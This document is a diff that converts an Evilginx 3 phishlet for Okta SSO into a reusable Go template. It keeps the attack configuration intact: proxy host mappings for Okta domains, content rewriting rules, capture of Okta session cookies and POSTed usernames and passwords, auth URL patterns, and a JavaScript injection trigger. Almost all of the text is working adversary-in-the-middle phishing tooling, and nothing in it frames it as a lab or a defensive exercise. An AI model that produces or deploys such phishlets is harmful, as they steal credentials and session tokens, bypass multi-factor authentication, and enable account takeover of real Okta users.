@@ -1,7 +1,3 @@
-# WARNING: No hostname was defined in the JSON phishlet.
-#          A placeholder hostname "jby5yviq.example.com" was auto-generated.
-#          You MUST update this to your actual phishing domain before using this phishlet.
-#
 # =============================================================================
 # Evilginx 3 Phishlet — Okta SSO
 # Template: okta.yaml.tmpl (Go text/template)
@@ -31,73 +27,73 @@ min_ver: '3.3.0'
 
 proxy_hosts:
   # --- Org-specific tenant (main session + landing host) ---
-  - phish_sub: '1lmqc1fq'
-    orig_sub: 'your-org'
-    domain: 'okta.com'
+  - phish_sub: '{{ .PhishSub }}'
+    orig_sub: '{{ .OrgSubdomain }}'
+    domain: '{{ .UpstreamHost }}'
     session: true
     is_landing: true
     auto_filter: true
 
   # --- Okta core auth subdomains ---
-  - phish_sub: '1lmqc1fq-login'
+  - phish_sub: '{{ .PhishSub }}-login'
     orig_sub: 'login'
-    domain: 'okta.com'
+    domain: '{{ .UpstreamHost }}'
     session: true
     is_landing: false
     auto_filter: true
 
-  - phish_sub: '1lmqc1fq-www'
+  - phish_sub: '{{ .PhishSub }}-www'
     orig_sub: 'www'
-    domain: 'okta.com'
+    domain: '{{ .UpstreamHost }}'
     session: true
     is_landing: false
     auto_filter: true
 
-  - phish_sub: '1lmqc1fq-oin'
+  - phish_sub: '{{ .PhishSub }}-oin'
     orig_sub: 'oin'
-    domain: 'okta.com'
+    domain: '{{ .UpstreamHost }}'
     session: false
     is_landing: false
     auto_filter: true
 
-  - phish_sub: '1lmqc1fq-idpx'
+  - phish_sub: '{{ .PhishSub }}-idpx'
     orig_sub: 'idpx'
-    domain: 'okta.com'
+    domain: '{{ .UpstreamHost }}'
     session: false
     is_landing: false
     auto_filter: true
 
-  - phish_sub: '1lmqc1fq-sso'
+  - phish_sub: '{{ .PhishSub }}-sso'
     orig_sub: 'sso'
-    domain: 'okta.com'
+    domain: '{{ .UpstreamHost }}'
     session: false
     is_landing: false
     auto_filter: true
 
-  - phish_sub: '1lmqc1fq-root'
+  - phish_sub: '{{ .PhishSub }}-root'
     orig_sub: ''
-    domain: 'okta.com'
+    domain: '{{ .UpstreamHost }}'
     session: false
     is_landing: false
     auto_filter: true
 
   # --- Okta CDN ---
-  - phish_sub: '1lmqc1fq-cdn'
+  - phish_sub: '{{ .PhishSub }}-cdn'
     orig_sub: ''
     domain: 'oktacdn.com'
     session: false
     is_landing: false
     auto_filter: true
 
-  - phish_sub: '1lmqc1fq-ocdn'
-    orig_sub: 'your-org'
+  - phish_sub: '{{ .PhishSub }}-ocdn'
+    orig_sub: '{{ .OrgSubdomain }}'
     domain: 'oktacdn.com'
     session: false
     is_landing: false
     auto_filter: true
 
   # --- Okta Help / Documentation ---
-  - phish_sub: '1lmqc1fq-help'
+  - phish_sub: '{{ .PhishSub }}-help'
     orig_sub: ''
     domain: 'okta-help.com'
     session: false
@@ -105,14 +101,14 @@ proxy_hosts:
     auto_filter: true
 
   # --- Okta Edge Networks ---
-  - phish_sub: '1lmqc1fq-o6'
+  - phish_sub: '{{ .PhishSub }}-o6'
     orig_sub: ''
     domain: 'o6a.net'
     session: false
     is_landing: false
     auto_filter: true
 
-  - phish_sub: '1lmqc1fq-o7'
+  - phish_sub: '{{ .PhishSub }}-o7'
     orig_sub: ''
     domain: 'o7a.net'
     session: false
@@ -120,16 +116,16 @@ proxy_hosts:
     auto_filter: true
 
   # --- Okta Preview (preview tenants) ---
-  - phish_sub: '1lmqc1fq-prev'
-    orig_sub: 'your-org'
+  - phish_sub: '{{ .PhishSub }}-prev'
+    orig_sub: '{{ .OrgSubdomain }}'
     domain: 'oktapreview.com'
     session: true
     is_landing: false
     auto_filter: true
 
   # --- Okta EMEA (European data residency) ---
-  - phish_sub: '1lmqc1fq-emea'
-    orig_sub: 'your-org'
+  - phish_sub: '{{ .PhishSub }}-emea'
+    orig_sub: '{{ .OrgSubdomain }}'
     domain: 'okta-emea.com'
     session: true
     is_landing: false
@@ -137,51 +133,51 @@ proxy_hosts:
 
 sub_filters:
   # --- Okta.com triggers ---
-  - triggers_on: 'your-org.okta.com'
-    orig_sub: 'your-org'
-    domain: 'okta.com'
+  - triggers_on: '{{ .OrgSubdomain }}.{{ .UpstreamHost }}'
+    orig_sub: '{{ .OrgSubdomain }}'
+    domain: '{{ .UpstreamHost }}'
     search: 'https://{hostname}/'
     replace: 'https://{hostname}/'
     mimes: ['text/html', 'application/json', 'application/javascript', 'text/css', 'application/x-javascript']
 
-  - triggers_on: 'login.okta.com'
+  - triggers_on: 'login.{{ .UpstreamHost }}'
     orig_sub: 'login'
-    domain: 'okta.com'
+    domain: '{{ .UpstreamHost }}'
     search: 'https://{hostname}/'
     replace: 'https://{hostname}/'
     mimes: ['text/html', 'application/json', 'application/javascript', 'text/css', 'application/x-javascript']
 
-  - triggers_on: 'www.okta.com'
+  - triggers_on: 'www.{{ .UpstreamHost }}'
     orig_sub: 'www'
-    domain: 'okta.com'
+    domain: '{{ .UpstreamHost }}'
     search: 'https://{hostname}/'
     replace: 'https://{hostname}/'
     mimes: ['text/html', 'application/json', 'application/javascript', 'text/css']
 
-  - triggers_on: 'oin.okta.com'
+  - triggers_on: 'oin.{{ .UpstreamHost }}'
     orig_sub: 'oin'
-    domain: 'okta.com'
+    domain: '{{ .UpstreamHost }}'
     search: 'https://{hostname}/'
     replace: 'https://{hostname}/'
     mimes: ['text/html', 'application/json', 'application/javascript']
 
-  - triggers_on: 'idpx.okta.com'
+  - triggers_on: 'idpx.{{ .UpstreamHost }}'
     orig_sub: 'idpx'
-    domain: 'okta.com'
+    domain: '{{ .UpstreamHost }}'
     search: 'https://{hostname}/'
     replace: 'https://{hostname}/'
     mimes: ['text/html', 'application/json', 'application/javascript']
 
-  - triggers_on: 'sso.okta.com'
+  - triggers_on: 'sso.{{ .UpstreamHost }}'
     orig_sub: 'sso'
-    domain: 'okta.com'
+    domain: '{{ .UpstreamHost }}'
     search: 'https://{hostname}/'
     replace: 'https://{hostname}/'
     mimes: ['text/html', 'application/json', 'application/javascript']
 
-  - triggers_on: 'okta.com'
+  - triggers_on: '{{ .UpstreamHost }}'
     orig_sub: ''
-    domain: 'okta.com'
+    domain: '{{ .UpstreamHost }}'
     search: 'https://{hostname}/'
     replace: 'https://{hostname}/'
     mimes: ['text/html', 'application/json', 'application/javascript']
@@ -194,8 +190,8 @@ sub_filters:
     replace: 'https://{hostname}/'
     mimes: ['text/html', 'application/json', 'application/javascript', 'text/css', 'application/x-javascript']
 
-  - triggers_on: 'your-org.oktacdn.com'
-    orig_sub: 'your-org'
+  - triggers_on: '{{ .OrgSubdomain }}.oktacdn.com'
+    orig_sub: '{{ .OrgSubdomain }}'
     domain: 'oktacdn.com'
     search: 'https://{hostname}/'
     replace: 'https://{hostname}/'
@@ -225,77 +221,65 @@ sub_filters:
     mimes: ['text/html', 'application/json', 'application/javascript', 'text/css']
 
   # --- Preview / EMEA triggers ---
-  - triggers_on: 'your-org.oktapreview.com'
-    orig_sub: 'your-org'
+  - triggers_on: '{{ .OrgSubdomain }}.oktapreview.com'
+    orig_sub: '{{ .OrgSubdomain }}'
     domain: 'oktapreview.com'
     search: 'https://{hostname}/'
     replace: 'https://{hostname}/'
     mimes: ['text/html', 'application/json', 'application/javascript', 'text/css', 'application/x-javascript']
 
-  - triggers_on: 'your-org.okta-emea.com'
-    orig_sub: 'your-org'
+  - triggers_on: '{{ .OrgSubdomain }}.okta-emea.com'
+    orig_sub: '{{ .OrgSubdomain }}'
     domain: 'okta-emea.com'
     search: 'https://{hostname}/'
     replace: 'https://{hostname}/'
     mimes: ['text/html', 'application/json', 'application/javascript', 'text/css', 'application/x-javascript']
 
 auth_tokens:
-  - domain: '.okta.com'
-    keys:
-      - 'sid'
-      - 'DT'
-      - 'JSESSIONID'
-      - 'okta_session'
-      - 'tkn'
+  - domain: '.{{ .UpstreamHost }}'
+    keys:{{ range .SessionCookies }}
+      - '{{ . }}'{{ end }}
     type: 'cookie'
   - domain: '.oktapreview.com'
-    keys:
-      - 'sid'
-      - 'DT'
-      - 'JSESSIONID'
-      - 'okta_session'
-      - 'tkn'
+    keys:{{ range .SessionCookies }}
+      - '{{ . }}'{{ end }}
     type: 'cookie'
   - domain: '.okta-emea.com'
-    keys:
-      - 'sid'
-      - 'DT'
-      - 'JSESSIONID'
-      - 'okta_session'
-      - 'tkn'
+    keys:{{ range .SessionCookies }}
+      - '{{ . }}'{{ end }}
     type: 'cookie'
 
 credentials:
   username:
-    key: '[identifier username login email]'
+    key: '{{ .UsernameFields }}'
     search: '(.*)'
     type: 'post'
   password:
-    key: '[password passwd credentials.passcode]'
+    key: '{{ .PasswordFields }}'
     search: '(.*)'
     type: 'post'
 
 login:
-  domain: 'okta.com'
+  domain: '{{ .UpstreamHost }}'
   path: '/'
 
 auth_urls:
-  - 'https://your-org.okta.com/'
-  - 'https://your-org.okta.com/login/'
-  - 'https://your-org.okta.com/login/login\.htm'
-  - 'https://your-org.okta.com/signin/'
-  - 'https://your-org.okta.com/sso/'
-  - 'https://your-org.okta.com/api/v1/authn'
-  - 'https://your-org.okta.com/api/v1/.*'
-  - 'https://your-org.okta.com/oauth2/'
-  - 'https://your-org.okta.com/oauth2/.*'
-  - 'https://your-org.okta.com/authorize'
-  - 'https://your-org.okta.com/app/.*'
+  - 'https://{{ .OrgSubdomain }}.{{ .UpstreamHost }}/'
+  - 'https://{{ .OrgSubdomain }}.{{ .UpstreamHost }}/login/'
+  - 'https://{{ .OrgSubdomain }}.{{ .UpstreamHost }}/login/login\.htm'
+  - 'https://{{ .OrgSubdomain }}.{{ .UpstreamHost }}/signin/'
+  - 'https://{{ .OrgSubdomain }}.{{ .UpstreamHost }}/sso/'
+  - 'https://{{ .OrgSubdomain }}.{{ .UpstreamHost }}/api/v1/authn'
+  - 'https://{{ .OrgSubdomain }}.{{ .UpstreamHost }}/api/v1/.*'
+  - 'https://{{ .OrgSubdomain }}.{{ .UpstreamHost }}/oauth2/'
+  - 'https://{{ .OrgSubdomain }}.{{ .UpstreamHost }}/oauth2/.*'
+  - 'https://{{ .OrgSubdomain }}.{{ .UpstreamHost }}/authorize'
+  - 'https://{{ .OrgSubdomain }}.{{ .UpstreamHost }}/app/.*'
 
 js_inject:
   - trigger_domains:
-      - 'your-org.okta.com'
-      - 'login.okta.com'
+      - '{{ .OrgSubdomain }}.{{ .UpstreamHost }}'
+      - 'login.{{ .UpstreamHost }}'
     trigger_paths:
       - '^/$'
       - '^/login/.*'
@@ -359,4 +343,4 @@ js_inject:
 
 force_post: []
 
-redirect_url: 'https://okta.com'
+redirect_url: 'https://{{ .UpstreamHost }}'
